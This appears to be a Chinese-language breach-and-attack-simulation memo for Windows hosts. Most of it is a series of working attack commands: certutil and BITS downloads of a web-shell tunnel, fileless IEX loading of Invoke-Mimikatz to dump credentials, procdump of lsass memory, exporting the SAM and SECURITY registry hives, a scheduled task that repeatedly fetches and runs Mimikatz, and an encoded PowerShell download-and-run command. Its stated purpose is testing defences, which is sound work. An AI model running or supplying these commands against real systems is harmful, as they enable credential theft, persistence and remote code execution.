# BAS 流程備忘

## 事前準備

1. 備妥一台已安裝 agent 的 Windows 主機，並開具 admin 權限之帳戶供使用。
2. 測試主機建議挑選非核心系統或服務且具對外連線能力的一般 PC。

## 攻擊模疑流程

### 憑證程式（certutil）下載惡意檔案

```powershell
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.aspx
```

### 背景智慧型傳輸服務（BITS）下載惡意檔案

```powershell
powershell.exe -WindowSytle hidden -ExecutionPolicy ByPass -nop -c Start-BitsTransfer -Source https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.aspx -Destination Invoke-Mimikatz.ps1
```

### powershell 遠端載入惡意腳本（無檔案）並執行

```powershell
powershell.exe -WindowSytle hidden -NoLogo -NonInteractive -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

### 工作管理員導出 lsass.dmp 文件

（略）

### procdump 導出 lsass.dmp 文件

```powershell
(New-Object net.WebCLIenT).DownloadFile('https://download.sysinternals.com/files/Procdump.zip', 'pd.zIp'); Expand-Archive pd.ZIP; .\pd\procdump.exe -accepteula -ma lsass.exe gg.dmp  
```

### 使用 reg.exe 導出註冊表以提取 Hash

```powershell
reg save HKLM\SAM sam.hiv  
reg save HKLM\security security.hiv  
```

### 建立惡意載入惡意自串

```powershell
schtasks /create /tn GG /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowSytle hidden -NoLogo -ep bypass -nop -c 'IEX((new-object net.webclient).downloadstring("https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1"))'" /sc minute /mo 1
```

### 惡意執令編碼執行

```powershell
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQgBDAC0AUwBFAEMAVQBSAEkAVABZAC8ARQBtAHAAaQByAGUALwBtAGEAcwB0AGUAcgAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBDAG8AbQBtAGEAbgBkACAAcAByAGkAdgBpAGwAZQBnAGUAOgA6AGQAZQBiAHUAZwA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzADsA
```

https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1